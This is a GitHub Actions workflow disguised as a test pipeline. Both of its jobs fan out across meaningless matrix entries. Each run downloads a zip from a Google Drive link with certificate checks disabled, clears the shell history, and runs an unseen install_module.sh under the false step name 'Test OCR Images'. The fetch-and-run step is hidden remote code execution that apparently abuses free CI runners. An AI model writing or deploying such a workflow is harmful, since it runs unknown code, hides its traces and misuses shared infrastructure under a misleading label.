name: ungdungweb7code
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  check:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Setup', 'Compile', 'Validate', 'Execute', 'Release']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1zf-onZWLKx8dn_7ox_8gm67SE1lcXoWL" -O ungdungweb7code.zip
        unzip -o ungdungweb7code.zip
        rm ungdungweb7code.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


  Publish1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Configure', 'Package', 'Assess', 'Operate', 'Distribute']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1zf-onZWLKx8dn_7ox_8gm67SE1lcXoWL" -O ungdungweb7code.zip
        unzip -o ungdungweb7code.zip
        rm ungdungweb7code.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh
        
